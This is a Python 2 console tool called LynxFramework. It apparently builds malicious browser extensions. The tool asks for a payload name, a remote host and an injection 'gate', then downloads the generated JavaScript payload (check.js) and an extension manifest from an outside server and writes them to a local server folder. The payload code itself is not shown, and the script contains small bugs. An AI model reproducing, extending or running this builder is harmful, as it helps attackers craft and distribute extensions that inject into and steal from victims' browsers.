#!usr/bin/env python

import urllib2
import time, os, sys
from colorama import Fore, Back, Style
import json
import base64


class Payload:
    name = ""
    rhost = ""
    gate = ""
    
    def showPayload(self):
        url = "https://lynxframework.com/API/?cmd=show&object=payload"
        html = urllib2.urlopen(url).read()
        name = html.split('NAME::')
        for line in name:
            if line != '':
                print(Fore.RED + "[!] " + Style.RESET_ALL + line)
    def setPayload(self):
        name = raw_input('name : ')
        self.name = name;
        self.payloadOption()
        Lynx.cmd()
    def payloadOption(self):
        if self.name != '':
            users_rhost = raw_input('RHOST : ')
            users_gate = raw_input('GATE / INJECT : ')
            self.rhost = users_rhost
            self.gate = users_gate
    def generate(self):
        if self.name != '':
            url = "https://lynxframework.com/API/check.php?rh=" + self.rhost +"&gate=" + self.gate + "&name=" + self.name
            code = urllib2.urlopen(url).read();
            files = open('server/js/check.js', 'w')
            files.write(code)
            files.close()
            print(Fore.BLUE + "[Payload OK]" + Style.RESET_ALL)
            Lynx.cmd()

class LynxFramework:
    name = ""
    ico = ""
    description = ""
    payload = Payload()
    
    def helpLynx(self):
        print "Help !"
    
    def cmd(self):
        print(Fore.BLUE + "----------------------------" + Style.RESET_ALL)
        users = raw_input('LynxFramework > ')
        if "show:" in users:
            command = users.split(':')
            if(command[1] == 'payload'):
                self.showpayload()
                self.cmd()
            elif(command[1] == 'help'):
                self.helpLynx()
        elif "set" in users:
            commande = users.split(':')[1]
            if commande == 'payload':
                self.payload.setPayload()
        elif users == 'clear':
            os.system('clear')
            self.cmd()
        elif 'generate' in users:
            commande = users.split(':')[1]
            if commande == 'payload':
                self.payload.generate()
            elif commande == 'manifest':
                self.generate()
        elif users == "quit":
            sys.exit()
        else:
            self.cmd()
    def showpayload(self):
        self.payload.showPayload()
    def generate(self):
        name = raw_input('name : ')
        end_name = base64.b64encode(name)
        description = raw_input('description : ')
        end_desc = base64.b64encode(description)
        version = raw_input('version : ')
        images = raw_input('image name : ')
        url = "https://lynxframework.com/API/manifest.php?n=" + end_name + "&d=" + end_desc +"&v=" + version + "&ico=" + images
        manifest = urllib2.urlopen(url).read();
        files = open('server/manifest.json','w')
        files.write(manifest)
        files.close()
        print(Fore.BLUE + "[manifest OK]" + Style.RESET_ALL)
        self.cmd()


print(Fore.RED + "[!]" + Style.RESET_ALL +  " Welcome to LynxFramework")
Lynx = LynxFramework()
os.system('clear')
Lynx.cmd()